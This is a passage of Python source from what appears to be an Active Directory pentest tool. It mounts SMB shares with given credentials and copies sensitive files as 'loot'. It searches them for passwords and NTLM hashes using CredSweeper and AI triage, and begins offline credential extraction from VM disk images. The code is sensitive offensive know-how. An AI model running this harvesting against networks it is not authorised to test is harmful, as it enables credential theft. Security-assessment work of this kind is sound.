            operation_label="deterministic mapped artifact scan",
        )
    else:
        target_pairs = _resolve_cifs_host_share_targets(
            hosts=hosts,
            shares=shares,
            share_map=share_map,
        )
        download_result = _run_rclone_copy_loot_download(
            shell=shell,
            domain=domain,
            username=username,
            password=password,
            target_pairs=target_pairs,
            loot_dir=loot_dir,
            extensions=get_sensitive_phase_extensions(phase),
            mostly_small_files=False,
            operation_label="deterministic artifact scan",
        )
    if not bool(download_result.get("success")):
        return {"completed": False, "artifact_hits": 0, "phase": phase}

    artifact_files = _list_files_under_path(loot_dir)
    spidering_service = shell._get_spidering_service()
    artifact_records: list[ArtifactProcessingRecord] = []
    for file_path in artifact_files:
        artifact_records.append(
            spidering_service.process_found_file(
                file_path,
                domain,
                "ext",
                source_hosts=hosts,
                source_shares=shares,
                auth_username=username,
                enable_legacy_zip_callbacks=False,
                apply_actions=True,
            )
        )
    loot_rel = os.path.relpath(loot_dir, shell._get_workspace_cwd())
    if not artifact_files:
        print_info(f"No artifact candidates were detected for phase {phase_label}.")
    else:
        report_path = _persist_artifact_processing_report(
            phase_root_abs=phase_root_abs,
            records=artifact_records,
        )
        _render_artifact_processing_summary(
            shell,
            phase_label=phase_label,
            records=artifact_records,
            report_path=report_path,
        )
        if artifact_records_extracted_nothing(artifact_records):
            render_no_extracted_findings_preview(
                loot_dir=loot_dir,
                loot_rel=loot_rel,
                analyzed_count=len(artifact_files),
                category="artifact",
                phase_label=phase_label,
                preview_limit=5,
            )
    print_info(
        "Deterministic rclone artifact summary: "
        f"phase={mark_sensitive(phase_label, 'text')} "
        f"artifact_hits={len(artifact_files)} "
        f"loot={mark_sensitive(loot_rel, 'path')}"
    )
    if cache_enabled and cache_entries:
        cache_service.write_cache_manifest(
            manifest_path=cache_paths["manifest_path"],
            phase=phase,
            signature=cache_signature,
            candidate_files=len(artifact_files),
            extra={
                "artifact_hits": len(artifact_files),
                "artifact_records": cache_service.serialize_artifact_records(
                    artifact_records
                ),
            },
        )
    return {
        "completed": True,
        "artifact_hits": len(artifact_files),
        "phase": phase,
        "loot_dir": loot_dir,
        "cache_reused": False,
    }


def _run_post_mapping_deterministic_cifs_credsweeper_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    cifs_mount_root: str | None = None,
    profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    phase: str = SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    analysis_context: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """Run deterministic CIFS-mounted share analysis with CredSweeper."""
    from adscan_internal.services.cifs_credsweeper_scan_service import (
        CIFSCredSweeperScanService,
    )
    from adscan_internal.services.credsweeper_service import CredSweeperService

    credsweeper_path = str(getattr(shell, "credsweeper_path", "") or "").strip()
    if not credsweeper_path:
        print_warning(
            "Deterministic CIFS share analysis is unavailable because "
            "CredSweeper is not configured."
        )
        return {"completed": False, "credential_findings": 0, "phase": phase}

    effective_mount_root = str(
        cifs_mount_root or ""
    ).strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS mount orchestration for deterministic scan failed unexpectedly."
        )
        print_warning_debug(
            f"CIFS deterministic mount exception: {type(exc).__name__}: {exc}"
        )
        print_warning_debug(traceback.format_exc())

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS deterministic analysis root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return {"completed": False, "credential_findings": 0, "phase": phase}

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username or "unknown", "user")
    analysis_context = analysis_context or {}
    ai_history_path = _resolve_smb_loot_ai_history_path(
        shell,
        domain=domain,
        username=username,
        phase=phase,
        backend="cifs",
    )
    print_info(
        "Running deterministic share analysis "
        f"({get_sensitive_phase_definition(phase).get('label', 'CIFS + CredSweeper')}) "
        f"for domain {marked_domain} as {marked_user}."
    )

    credsweeper_service = (
        shell._get_credsweeper_service()
        if callable(getattr(shell, "_get_credsweeper_service", None))
        else CredSweeperService(shell.run_command)
    )
    scan_service = CIFSCredSweeperScanService()
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="cifs_deterministic",
    )
    try:
        scan_result = scan_service.scan_mounted_shares(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            credsweeper_service=credsweeper_service,
            credsweeper_path=credsweeper_path,
            json_output_dir=artifacts_dir,
            profile=profile,
        )

        print_info(
            "Deterministic CIFS scan summary: "
            f"mapped_shares={scan_result.mapped_shares} "
            f"candidate_files={scan_result.candidate_files} "
            f"scanned_files={scan_result.scanned_files} "
            f"files_with_findings={scan_result.files_with_findings} "
            f"credential_like_findings={scan_result.total_findings}"
        )

        structured_stats = (
            shell._get_spidering_service().process_local_structured_files(
                root_path=effective_mount_root,
                phase=phase,
                domain=domain,
                source_hosts=hosts,
                source_shares=shares,
                auth_username=username,
                apply_actions=True,
            )
        )
        structured_files_with_findings = int(
            structured_stats.get("files_with_findings", 0) or 0
        )
        ntlm_hash_findings = structured_stats.get("ntlm_hash_findings")
        if isinstance(ntlm_hash_findings, list) and ntlm_hash_findings:
            loot_rel = os.path.relpath(effective_mount_root, shell._get_workspace_cwd())
            render_ntlm_hash_findings_flow(
                shell,
                domain=domain,
                loot_dir=effective_mount_root,
                loot_rel=loot_rel,
                phase_label=str(
                    get_sensitive_phase_definition(phase).get("label", phase)
                ),
                ntlm_hash_findings=[
                    item for item in ntlm_hash_findings if isinstance(item, dict)
                ],
                source_scope=(
                    "SMB file NTLM hash findings from "
                    f"{str(get_sensitive_phase_definition(phase).get('label', phase))}"
                ),
                fallback_source_hosts=hosts,
                fallback_source_shares=shares,
            )
        analysis_result = run_loot_credential_analysis(
            shell,
            domain=domain,
            loot_dir=effective_mount_root,
            phase=phase,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
            candidate_files=int(scan_result.candidate_files),
            analysis_context=analysis_context,
            ai_history_path=ai_history_path,
            credsweeper_path=credsweeper_path,
            credsweeper_output_dir=artifacts_dir,
            jobs=get_default_credsweeper_jobs(),
            credsweeper_findings=dict(scan_result.findings),
        )
        combined_findings = dict(analysis_result.findings)
        ai_findings = list(analysis_result.ai_findings)
        ai_attempted = analysis_result.ai_attempted
        ai_success = analysis_result.ai_success
        if ai_attempted:
            analysis_context["ai_attempted"] = True
            analysis_context["ai_success"] = ai_success
        total_ai_findings, ai_files_with_findings = _count_grouped_credential_findings(
            combined_findings
        )
        if combined_findings:
            shell.handle_found_credentials(
                combined_findings,
                domain,
                source_hosts=hosts,
                source_shares=shares,
                auth_username=username,
                source_artifact="CIFS mounted share scan",
                analysis_origin=(
                    "mixed"
                    if analysis_result.analysis_engine == _SMB_LOOT_ANALYSIS_ENGINE_BOTH
                    else (
                        "ai"
                        if analysis_result.analysis_engine
                        == _SMB_LOOT_ANALYSIS_ENGINE_AI
                        else "credsweeper"
                    )
                ),
                ai_findings=ai_findings,
            )
        elif structured_files_with_findings == 0:
            loot_rel = os.path.relpath(effective_mount_root, shell._get_workspace_cwd())
            _print_analyzed_no_findings_preview(
                loot_dir=effective_mount_root,
                loot_rel=loot_rel,
                candidate_files=int(scan_result.candidate_files),
                phase_label=str(
                    get_sensitive_phase_definition(phase).get("label", phase)
                ),
                preview_limit=5,
            )
        render_ranked_findings_panel(
            findings=list(analysis_result.secret_findings),
            loot_dir=effective_mount_root,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        )
        render_files_of_concern_panel(
            indicators=list(analysis_result.indicators),
            loot_dir=effective_mount_root,
            phase_label=str(get_sensitive_phase_definition(phase).get("label", phase)),
        )
        return {
            "completed": True,
            "credential_findings": int(total_ai_findings),
            "files_with_findings": int(
                int(ai_files_with_findings) + structured_files_with_findings
            ),
            "candidate_files": int(scan_result.candidate_files),
            "phase": phase,
            "ai_attempted": ai_attempted,
            "ai_success": ai_success,
        }
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("CIFS deterministic share analysis failed unexpectedly.")
        print_warning_debug(
            f"CIFS deterministic scan exception: {type(exc).__name__}: {exc}"
        )
        print_warning_debug(traceback.format_exc())
        return {"completed": False, "credential_findings": 0, "phase": phase}
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                "CIFS unmount cleanup failed unexpectedly after deterministic scan."
            )
            print_warning_debug(
                f"CIFS deterministic unmount exception: {type(exc).__name__}: {exc}"
            )


def _run_post_mapping_deterministic_cifs_artifact_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
    username: str,
    password: str,
    cifs_mount_root: str | None = None,
    phase: str,
) -> dict[str, Any]:
    """Run one local CIFS-backed artifact phase using the shared spidering service."""
    phase_root_abs = domain_path(
        getattr(shell, "domains_dir", None),
        domain,
        "smb",
        "cifs",
        "deterministic",
        phase,
    )
    os.makedirs(phase_root_abs, exist_ok=True)
    effective_mount_root = str(
        cifs_mount_root or ""
    ).strip() or _resolve_cifs_mount_root(
        shell=shell,
        domain=domain,
    )
    marked_mount_root = mark_sensitive(effective_mount_root, "path")
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            f"CIFS artifact phase mount exception: {type(exc).__name__}: {exc}"
        )

    if not os.path.isdir(effective_mount_root):
        print_warning(
            "CIFS artifact analysis root is not accessible. "
            f"Expected mounted content at {marked_mount_root}."
        )
        _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        return {"completed": False, "artifact_hits": 0, "phase": phase}

    phase_label = str(get_sensitive_phase_definition(phase).get("label", phase))
    print_info(
        f"Running deterministic share analysis ({phase_label}) "
        f"from mounted CIFS content at {marked_mount_root}."
    )

    artifact_hits = 0
    artifact_records: list[ArtifactProcessingRecord] = []
    try:
        spidering_service = shell._get_spidering_service()
        for file_path in _iter_cifs_phase_candidate_files(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            phase=phase,
            aggregate_map_path=_resolve_cifs_aggregate_map_path(
                shell=shell,
                domain=domain,
            ),
        ):
            artifact_hits += 1
            artifact_records.append(
                spidering_service.process_found_file(
                    file_path,
                    domain,
                    "ext",
                    source_hosts=hosts,
                    source_shares=shares,
                    auth_username=username,
                    enable_legacy_zip_callbacks=False,
                )
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("CIFS artifact phase failed unexpectedly.")
        print_warning_debug(
            f"CIFS artifact phase exception: {type(exc).__name__}: {exc}"
        )
        print_warning_debug(traceback.format_exc())
        return {"completed": False, "artifact_hits": artifact_hits, "phase": phase}
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"CIFS artifact phase unmount exception: {type(exc).__name__}: {exc}"
            )

    if artifact_hits == 0:
        print_info(f"No artifact candidates were detected for phase {phase_label}.")
    else:
        report_path = _persist_artifact_processing_report(
            phase_root_abs=phase_root_abs,
            records=artifact_records,
        )
        _render_artifact_processing_summary(
            shell,
            phase_label=phase_label,
            records=artifact_records,
            report_path=report_path,
        )
        if artifact_records_extracted_nothing(artifact_records):
            render_no_extracted_findings_preview(
                loot_dir=effective_mount_root,
                loot_rel=os.path.relpath(
                    effective_mount_root, shell._get_workspace_cwd()
                ),
                analyzed_count=artifact_hits,
                category="artifact",
                phase_label=phase_label,
                preview_limit=5,
            )
    return {"completed": True, "artifact_hits": artifact_hits, "phase": phase}


def _iter_cifs_phase_candidate_files(
    *,
    mount_root: str,
    hosts: list[str],
    shares: list[str],
    phase: str,
    aggregate_map_path: str | None = None,
) -> list[str]:
    """Return local CIFS-backed files matching one artifact phase."""
    return _iter_cifs_extension_candidate_files(
        mount_root=mount_root,
        hosts=hosts,
        shares=shares,
        extensions=get_sensitive_phase_extensions(phase),
        aggregate_map_path=aggregate_map_path,
        max_file_size_bytes=get_sensitive_phase_max_file_size_bytes(phase),
    )


def _iter_cifs_extension_candidate_files(
    *,
    mount_root: str,
    hosts: list[str],
    shares: list[str],
    extensions: tuple[str, ...],
    aggregate_map_path: str | None = None,
    max_file_size_bytes: int | None = None,
) -> list[str]:
    """Return local CIFS-backed files matching one extension set."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )

    mapping_service = CIFSShareMappingService()
    mount_root_path = Path(mount_root).expanduser().resolve(strict=False)
    suffixes = {ext.casefold() for ext in extensions}
    if not suffixes:
        return []

    unique_hosts = list(
        dict.fromkeys(str(host).strip() for host in hosts if str(host).strip())
    )
    unique_shares = list(
        dict.fromkeys(str(share).strip() for share in shares if str(share).strip())
    )
    allow_share_fallback = len(unique_hosts) <= 1
    if aggregate_map_path:
        mapped_candidates = (
            mapping_service.resolve_candidate_local_paths_from_aggregate(
                aggregate_map_path=aggregate_map_path,
                mount_root=str(mount_root_path),
                hosts=unique_hosts,
                shares=unique_shares,
                extensions=tuple(suffixes),
                max_file_size_bytes=max_file_size_bytes,
            )
        )
        if mapped_candidates:
            return mapped_candidates

    candidates: list[str] = []
    for host in unique_hosts:
        for share in unique_shares:
            share_root = mapping_service.resolve_share_mount_path(
                mount_root=mount_root_path,
                host=host,
                share=share,
                allow_share_root_fallback=allow_share_fallback,
            )
            if share_root is None:
                continue
            for dirpath, dirnames, filenames in os.walk(share_root):
                prune_excluded_walk_dirs(dirnames)
                for filename in sorted(filenames):
                    file_path = Path(dirpath) / filename
                    try:
                        relative_path = file_path.relative_to(share_root).as_posix()
                    except ValueError:
                        continue
                    if is_globally_excluded_smb_relative_path(relative_path):
                        continue
                    if (
                        resolve_effective_sensitive_extension(
                            str(file_path),
                            allowed_extensions=tuple(suffixes),
                        )
                        not in suffixes
                    ):
                        continue
                    if isinstance(max_file_size_bytes, int) and max_file_size_bytes > 0:
                        try:
                            if int(file_path.stat().st_size) > max_file_size_bytes:
                                continue
                        except OSError:
                            continue
                    candidates.append(str(file_path))
    return candidates


def _select_post_mapping_sensitive_data_method(
    *,
    shell: Any,
    ai_configured: bool,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
) -> str | None:
    """Select sensitive-data analysis mode for SMB share workflows.

    Acquisition backend UX stays hidden here. We only ask whether the user
    wants to search share loot at all; the credential analysis engine is
    selected later, after loot is available locally.
    """
    if getattr(shell, "auto", False):
        selected = _resolve_default_deterministic_share_analysis_method(
            shell,
            domain=domain,
            username=username,
            password=password,
        )
        return _normalize_sensitive_data_method_for_smb_auth(
            shell,
            domain=domain,
            username=username,
            selected_method=selected,
        )
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        print_info_debug(
            "Post-mapping selector unavailable; defaulting to deterministic share analysis."
        )
        return _select_deterministic_share_analysis_method(
            shell,
            domain=domain,
            username=username,
            password=password,
        )

    primary_options = [
        "Search for credentials in share loot",
        "Skip sensitive-data analysis",
    ]
    primary_idx = selector(
        "Search for credentials in SMB shares?",
        primary_options,
        default_idx=0,
    )
    if primary_idx == 1:
        return None
    return _select_deterministic_share_analysis_method(
        shell,
        domain=domain,
        username=username,
        password=password,
    )


def _select_deterministic_share_analysis_method(
    shell: Any,
    *,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
) -> str | None:
    """Resolve deterministic SMB share analysis backend without prompting."""
    selected_method = _resolve_default_deterministic_share_analysis_method(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    selected_method = _normalize_sensitive_data_method_for_smb_auth(
        shell,
        domain=domain,
        username=username,
        password=password,
        selected_method=selected_method,
    )
    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or "unknown"
    print_info_debug(
        "Deterministic SMB backend selected automatically: "
        f"workspace_type={workspace_type} method={selected_method}"
    )
    return selected_method


def _run_post_mapping_ai_triage(
    shell: Any,
    *,
    domain: str,
    aggregate_map_abs: str,
    aggregate_map_rel: str,
    triage_username: str | None = None,
    triage_password: str | None = None,
    read_backend: str = "smb_impacket",
    cifs_mount_root: str | None = None,
) -> bool:
    """Run AI triage on consolidated share mapping JSON after spider_plus."""
    from adscan_internal.services.share_map_ai_triage_service import (
        ShareMapAITriageService,
    )

    ai_service = shell._get_ai_service()
    if ai_service is None:
        print_info_debug("AI triage skipped: AI service is unavailable.")
        return False

    scope = _select_post_mapping_ai_scope(shell)
    if scope is None:
        print_info("AI triage skipped by user.")
        return True

    triage_service = ShareMapAITriageService()
    try:
        mapping_json = triage_service.load_full_mapping_json(
            aggregate_map_path=aggregate_map_abs
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_map = mark_sensitive(aggregate_map_rel, "path")
        print_warning(
            f"AI triage skipped: could not load consolidated mapping from {marked_map}."
        )
        print_warning_debug(f"AI triage map load failure: {type(exc).__name__}: {exc}")
        return False

    active_username = ""
    if hasattr(shell, "domains_data") and isinstance(
        getattr(shell, "domains_data", None), dict
    ):
        domain_data = shell.domains_data.get(domain, {})
        if isinstance(domain_data, dict):
            active_username = str(domain_data.get("username", "")).strip()

    explicit_username = str(triage_username or "").strip()
    explicit_password = (
        str(triage_password).strip() if triage_password is not None else None
    )
    effective_username = explicit_username or active_username
    effective_password = explicit_password or ""
    is_guest_user = effective_username.lower() in {"guest", "anonymous"}
    principal_key, allowed_share_pairs = (
        triage_service.resolve_principal_allowed_shares(
            mapping_json=mapping_json,
            domain=domain,
            username=effective_username,
        )
    )
    if principal_key and allowed_share_pairs:
        total_before_scope = triage_service.count_total_file_entries(
            mapping_json=mapping_json
        )
        scoped_mapping_json = triage_service.filter_mapping_json_by_allowed_shares(
            mapping_json=mapping_json,
            allowed_share_pairs=allowed_share_pairs,
        )
        total_after_scope = triage_service.count_total_file_entries(
            mapping_json=scoped_mapping_json
        )
        mapping_json = scoped_mapping_json
        marked_principal = mark_sensitive(principal_key, "user")
        print_info_debug(
            "AI triage principal scope applied: "
            f"principal={marked_principal} "
            f"allowed_host_shares={len(allowed_share_pairs)} "
            f"files_before={total_before_scope} files_after={total_after_scope}"
        )
    elif principal_key:
        marked_principal = mark_sensitive(principal_key, "user")
        print_info_debug(
            "AI triage principal scope resolved but no READ share permissions found: "
            f"principal={marked_principal}"
        )
    elif effective_username:
        requested_principal = mark_sensitive(f"{domain}\\{effective_username}", "user")
        print_info_debug(
            "AI triage principal scope not found in share map; using full mapping: "
            f"principal={requested_principal}"
        )

    read_username = effective_username or None
    if effective_username and is_guest_user:
        read_username = resolve_smb_guest_username(shell=shell, domain=domain)

    if effective_username and effective_password:
        marked_user = mark_sensitive(effective_username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=spider_plus_run"
        )
    elif effective_username and is_guest_user:
        marked_user = mark_sensitive(effective_username, "user")
        marked_transport_user = mark_sensitive(read_username or "", "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=guest_session"
        )
        print_info_debug(
            "AI triage guest transport principal resolved: "
            f"logical_user={marked_user} transport_user={marked_transport_user}"
        )
    elif active_username:
        marked_user = mark_sensitive(active_username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=active_domain_context"
        )
    if read_backend == "cifs_local":
        resolved_root = str(cifs_mount_root or "").strip() or _resolve_cifs_mount_root(
            shell=shell,
            domain=domain,
        )
        marked_root = mark_sensitive(resolved_root, "path")
        print_info_debug(
            "AI triage read backend selected: backend=cifs_local "
            f"mount_root={marked_root}"
        )

    print_info_debug(
        f"AI triage share-map context loaded: scope={scope} chars={len(mapping_json)}"
    )
    total_files = triage_service.count_total_file_entries(mapping_json=mapping_json)
    max_prompt_chars = _resolve_ai_triage_max_prompt_chars()
    try:
        prompt_chunks = triage_service.build_triage_prompt_chunks(
            domain=domain,
            search_scope=scope,
            mapping_json=mapping_json,
            max_prompt_chars=max_prompt_chars,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning(
            "AI triage skipped: could not prepare a bounded share-map view for the model."
        )
        print_warning_debug(f"AI triage preflight failure: {type(exc).__name__}: {exc}")
        return False
    filtered_files = sum(chunk.file_entries for chunk in prompt_chunks)
    filtered_host_shares = sum(chunk.host_shares for chunk in prompt_chunks)
    print_info_debug(
        "AI triage preflight summary: "
        f"total_files={total_files} filtered_files={filtered_files} "
        f"chunks={len(prompt_chunks)} filtered_host_shares={filtered_host_shares} "
        f"max_prompt_chars={max_prompt_chars}"
    )
    if len(prompt_chunks) > 1:
        print_warning(
            "AI triage context exceeded the one-shot model budget. "
            f"Splitting the share map into {len(prompt_chunks)} filtered chunks."
        )
    print_info("Running AI triage on consolidated SMB share mapping...")
    prioritized_files: list[Any] = []
    seen_prioritized_keys: set[tuple[str, str, str]] = set()
    parse_statuses: list[str] = []
    triage_notes: list[str] = []
    stop_reasons: list[str] = []
    payload_present = False
    raw_priority_items = 0
    valid_priority_items = 0
    for chunk_index, chunk in enumerate(prompt_chunks, start=1):
        print_info_debug(
            "AI triage chunk dispatch: "
            f"index={chunk_index}/{len(prompt_chunks)} "
            f"label={chunk.chunk_label} file_entries={chunk.file_entries} "
            f"host_shares={chunk.host_shares} prompt_chars={chunk.prompt_chars}"
        )
        prompt = triage_service.build_triage_prompt(
            domain=domain,
            search_scope=scope,
            mapping_json=chunk.mapping_json,
        )
        response = ai_service.ask_once(prompt, allow_cli_actions=False)
        metadata = getattr(ai_service, "last_response_metadata", {}) or {}
        prompt_est_tokens = metadata.get("request_prompt_estimated_tokens")
        if isinstance(prompt_est_tokens, int):
            print_info_debug(
                "AI triage prompt estimated tokens="
                f"{prompt_est_tokens} for scope={scope} chunk={chunk.chunk_label}."
            )
            if prompt_est_tokens >= 70000:
                print_warning(
                    "AI triage context is very large and model output quality may degrade "
                    "(for example, malformed or empty JSON responses)."
                )
        triage_parse = triage_service.parse_triage_response(response_text=response)
        parse_statuses.append(triage_parse.parse_status)
        payload_present = payload_present or triage_parse.payload_present
        raw_priority_items += triage_parse.raw_priority_items
        valid_priority_items += triage_parse.valid_priority_items
        if triage_parse.stop_reason:
            stop_reasons.append(triage_parse.stop_reason)
        triage_notes.extend(triage_parse.notes)
        for candidate in triage_parse.prioritized_files:
            key = (
                str(candidate.host).strip().lower(),
                str(candidate.share).strip().lower(),
                str(candidate.path).strip().lower(),
            )
            if key in seen_prioritized_keys:
                continue
            seen_prioritized_keys.add(key)
            prioritized_files.append(candidate)

    size_index = triage_service.build_file_size_index(mapping_json=mapping_json)
    if allowed_share_pairs:
        before_count = len(prioritized_files)
        prioritized_files = triage_service.filter_priority_files_by_allowed_shares(
            prioritized_files=prioritized_files,
            allowed_share_pairs=allowed_share_pairs,
        )
        dropped = before_count - len(prioritized_files)
        if dropped > 0:
            print_info_debug(
                "AI prioritized files filtered by principal share permissions: "
                f"dropped={dropped} kept={len(prioritized_files)}"
            )
    _render_ai_triage_prioritization_summary(
        shell,
        prioritized_files=prioritized_files,
        total_files=total_files,
    )

    if not prioritized_files:
        print_warning(
            "AI triage did not return a valid priority_files list. "
            "Skipping per-file analysis."
        )
        print_info_debug(
            "AI triage parse diagnostics: "
            f"status={','.join(parse_statuses) or 'none'} "
            f"payload_present={payload_present} "
            f"raw_priority_items={raw_priority_items} "
            f"valid_priority_items={valid_priority_items}"
        )
        for stop_reason in stop_reasons:
            marked_stop_reason = mark_sensitive(stop_reason, "text")
            print_info_debug(f"AI triage stop_reason: {marked_stop_reason}")
        for note in triage_notes:
            marked_note = mark_sensitive(note, "text")
            print_info_debug(f"AI triage note: {marked_note}")
        return False

    read_mode_label = (
        "local CIFS reads"
        if read_backend == "cifs_local"
        else "Impacket byte-stream reads"
    )
    if not Confirm.ask(
        f"Do you want AI to inspect these prioritized files using {read_mode_label}?",
        default=True,
    ):
        print_info("AI prioritized file inspection cancelled by user.")
        return True

    _run_ai_prioritized_file_analysis(
        shell,
        domain=domain,
        scope=scope,
        triage_service=triage_service,
        ai_service=ai_service,
        prioritized_files=prioritized_files,
        size_index=size_index,
        read_username=read_username,
        read_password=explicit_password if effective_username else None,
        read_domain=domain if effective_username else None,
        read_backend=read_backend,
        cifs_mount_root=cifs_mount_root,
        report_root_abs=os.path.join(
            os.path.dirname(aggregate_map_abs), "ai_prioritized"
        ),
    )
    return True


def _render_ai_triage_prioritization_summary(
    shell: Any,
    *,
    prioritized_files: list[Any],
    total_files: int,
) -> None:
    """Render AI prioritization summary after share-map triage."""
    selected = len(prioritized_files)
    print_info(
        f"AI triage selected {selected} prioritized file(s) out of {total_files} "
        "total mapped file(s)."
    )
    if not prioritized_files:
        return

    table = Table(
        title="[bold cyan]AI Prioritized SMB Files[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("#", style="cyan", justify="right")
    table.add_column("Host", style="cyan")
    table.add_column("Share", style="magenta")
    table.add_column("Path", style="yellow")
    table.add_column("Why", style="green")

    for idx, candidate in enumerate(prioritized_files, start=1):
        host = mark_sensitive(str(getattr(candidate, "host", "")), "hostname")
        share = mark_sensitive(str(getattr(candidate, "share", "")), "service")
        path = mark_sensitive(str(getattr(candidate, "path", "")), "path")
        why = str(getattr(candidate, "why", "") or "").strip()
        if len(why) > 120:
            why = why[:117] + "..."
        table.add_row(str(idx), host, share, path, why or "-")

    print_panel_with_table(table, border_style=BRAND_COLORS["info"])


def _run_ai_prioritized_file_analysis(
    shell: Any,
    *,
    domain: str,
    scope: str,
    triage_service: Any,
    ai_service: Any,
    prioritized_files: list[Any],
    size_index: dict[tuple[str, str, str], Any],
    read_username: str | None = None,
    read_password: str | None = None,
    read_domain: str | None = None,
    read_backend: str = "smb_impacket",
    cifs_mount_root: str | None = None,
    report_root_abs: str | None = None,
) -> None:
    """Analyze prioritized SMB files with AI using configured file-read backend."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )
    from adscan_internal.services.file_byte_reader_service import (
        LocalFileByteReaderService,
        SMBFileByteReaderService,
    )
    from adscan_internal.services.share_file_analysis_pipeline_service import (
        ShareFileAnalysisPipelineService,
    )
    from adscan_internal.services.share_file_analyzer_service import (
        ShareFileAnalyzerService,
    )
    from adscan_internal.services.share_file_content_extraction_service import (
        ShareFileContentExtractionService,
    )
    from adscan_internal.services.share_credential_provenance_service import (
        ShareCredentialProvenanceService,
    )
    from adscan_internal.services.vm_artifact_service import classify_vm_artifact

    reader_service = SMBFileByteReaderService()
    local_reader_service = LocalFileByteReaderService()
    cifs_mapping_service = CIFSShareMappingService()
    provenance_service = ShareCredentialProvenanceService()
    pipeline_service = ShareFileAnalysisPipelineService(
        analyzer_service=ShareFileAnalyzerService(
            command_executor=getattr(shell, "run_command", None),
            pypykatz_path=getattr(shell, "pypykatz_path", None),
        ),
        extraction_service=ShareFileContentExtractionService(),
    )
    max_bytes = _resolve_ai_file_read_max_bytes()
    read_failures = 0
    analyzed = 0
    deterministic_handled = 0
    deterministic_findings = 0
    flagged_files = 0
    flagged_credentials = 0
    skipped_oversized = 0
    forced_oversized = 0
    oversized_rows: list[tuple[str, str, str, str, str]] = []
    review_candidate_paths: list[str] = []
    continue_after_findings: bool | None = None
    local_reads = 0
    local_to_smb_fallbacks = 0

    for idx, candidate in enumerate(prioritized_files, start=1):
        host = str(getattr(candidate, "host", "")).strip()
        share = str(getattr(candidate, "share", "")).strip()
        path = str(getattr(candidate, "path", "")).strip()
        is_zip_candidate = _is_zip_path(path)
        if not host or not share or not path:
            read_failures += 1
            print_warning_debug(
                "Skipping invalid prioritized file candidate: "
                f"host={host!r} share={share!r} path={path!r}"
            )
            continue

        size_key = (host.lower(), share.lower(), path.lower())
        size_info = size_index.get(size_key)
        known_size_bytes = getattr(size_info, "size_bytes", None)
        known_size_text = str(getattr(size_info, "size_text", "") or "").strip()

        # VM disk artifacts: extract credentials OFFLINE without reading the multi-GB
        # image through the byte/oversized path. Inserted before the oversized gate so
        # a large disk is not skipped. With a CIFS mount the file is local (dissect
        # handles chains; CIFS reads sparsely); otherwise read sparsely over SMB.
        # Gated on classify_vm_artifact -> zero effect on non-VM files.
        vm_artifact_kind = classify_vm_artifact(path)
        if vm_artifact_kind in ("disk", "memory"):
            marked_host = mark_sensitive(host, "hostname")
            marked_share = mark_sensitive(share, "service")
            marked_path = mark_sensitive(path, "path")
            kind_label = "VM disk artifact" if vm_artifact_kind == "disk" else "VM memory image"
            print_info(
                f"[{idx}/{len(prioritized_files)}] {kind_label} {marked_path} on "
                f"{marked_host}/{marked_share} — offline credential extraction"
            )
            vm_local_path = ""
            if read_backend == "cifs_local":
